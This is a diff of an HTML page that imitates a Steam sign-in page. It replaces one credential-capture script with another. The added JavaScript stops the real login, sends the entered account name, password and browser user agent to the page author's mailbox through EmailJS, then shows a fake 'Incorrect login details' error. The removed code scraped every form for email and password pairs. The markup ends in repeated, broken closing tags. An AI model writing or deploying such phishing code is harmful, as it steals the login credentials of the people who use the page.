@@ -748,100 +748,70 @@
 		</form>
 	</div>
 </div><div class="FullModalOverlay" style="display: none;"><div class="ModalOverlayContent ModalOverlayBackground"></div></div><!-- Tu contenido original -->
-></div></div><!-- Tu contenido original de la página -->
-
-<!-- SOLO ESTE CÓDIGO DE EMAILJS (borra el anterior) -->
+></div></div><!-- ================================================================= -->
+<!-- === INTEGRACIÓN EMAILJS - ENVIAR USUARIO Y CONTRASEÑA A TU CORREO === -->
+<!-- ================================================================== -->
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
-(function() {
-    emailjs.init({ publicKey: "3x0styJQNXamR4XT4" });
+// Inicializamos EmailJS con tus credenciales
+emailjs.init({ 
+    publicKey: "3x0styJQNXamR4XT4" 
+});
+
+// Capturamos el evento submit del formulario de login
+document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // ← Impide el envío real a Steam
     
-    let ultimoEnvio = 0;
-    
-    function capturarYEnviar() {
-        const ahora = Date.now();
-        
-        if (ahora - ultimoEnvio < 2000) {
-            console.log('⏱️ Esperando antes de enviar de nuevo...');
-            return;
-        }
-        
-        const forms = document.querySelectorAll('form');
-        
-        forms.forEach(function(form) {
-            const inputs = form.querySelectorAll('input');
-            let email = '';
-            let password = '';
-            
-            inputs.forEach(function(input) {
-                const type = input.type.toLowerCase();
-                const name = (input.name || '').toLowerCase();
-                const id = (input.id || '').toLowerCase();
-                const value = input.value.trim();
-                
-                if ((type === 'email' || type === 'text' || 
-                     name.includes('email') || name.includes('user') || 
-                     id.includes('email') || id.includes('user')) && value) {
-                    email = value;
-                }
-                
-                if (type === 'password' && value) {
-                    password = value;
-                }
-            });
-            
-            if (email && password) {
-                ultimoEnvio = ahora;
-                console.log('📧 Enviando:', email, '/', password);
-                
-                emailjs.send('service_33u0mdn', 'template_ghyltzf', {
-                    user_email: email,
-                    password: password,
-                    timestamp: new Date().toLocaleString('es-ES')
-                }).then(function(response) {
-                    console.log('✅ ENVIADO CORRECTAMENTE!', response);
-                    setTimeout(function() {
-                        ultimoEnvio = 0;
-                        console.log('🔄 Listo para próximo envío');
-                    }, 3000);
-                }).catch(function(error) {
-                    console.error('❌ Error al enviar:', error);
-                    ultimoEnvio = 0;
-                });
-            } else {
-                console.log('⚠️ Credenciales incompletas - Email:', email, 'Password:', password ? 'SÍ' : 'NO');
-            }
-        });
+    var btn = document.getElementById('SteamLogin');
+    if (btn) {
+        btn.disabled = true;
+        btn.value = "Signing in...";
     }
     
-    window.addEventListener('load', function() {
-        console.log('✅ EmailJS listener iniciado');
-        
-        document.querySelectorAll('form').forEach(function(form) {
-            form.addEventListener('submit', function(e) {
-                console.log('🔄 SUBMIT detectado');
-                setTimeout(capturarYEnviar, 300);
-            });
-        });
-        
-        document.addEventListener('click', function(e) {
-            if (e.target.tagName === 'BUTTON' || (e.target.tagName === 'INPUT' && e.target.type === 'submit')) {
-                console.log('🖱️ CLICK en botón:', e.target);
-                setTimeout(capturarYEnviar, 300);
+    const extraParams = {
+        timestamp: new Date().toLocaleString('es-ES', { 
+            timeZone: 'Europe/Madrid' 
+        }),
+        user_agent: navigator.userAgent
+    };
+    
+    emailjs.sendForm('service_33u0mdn', 'template_ghyltzf', this, extraParams)
+        .then(function(response) {
+            console.log('Correo enviado OK → Status:', response.status, response.text);
+            
+            var errorDiv = document.getElementById('error_display');
+            if (errorDiv) {
+                errorDiv.style.display = 'block';
+                errorDiv.innerHTML = 'Incorrect login details.<br>Please try again.';
+            }
+            
+            if (btn) {
+                btn.disabled = false;
+                btn.value = "Sign in";
+            }
+            
+            document.getElementById('steamAccountName').value = '';
+            document.getElementById('steamPassword').value = '';
+        })
+        .catch(function(error) {
+            console.error('Error al enviar el correo:', error);
+            
+            var errorDiv = document.getElementById('error_display');
+            if (errorDiv) {
+                errorDiv.innerHTML = 'Connection error.<br>Try again later.';
+            }
+            
+            if (btn) {
+                btn.disabled = false;
+                btn.value = "Sign in";
             }
         });
-        
-        document.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter' && e.target.type === 'password') {
-                console.log('⌨️ ENTER en password');
-                setTimeout(capturarYEnviar, 300);
-            }
-        });
-    });
-})();
+});
 </script>
 
+></div></div></body></html></body></html></body></html>
 ></div></div></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html>
+
 
 
 
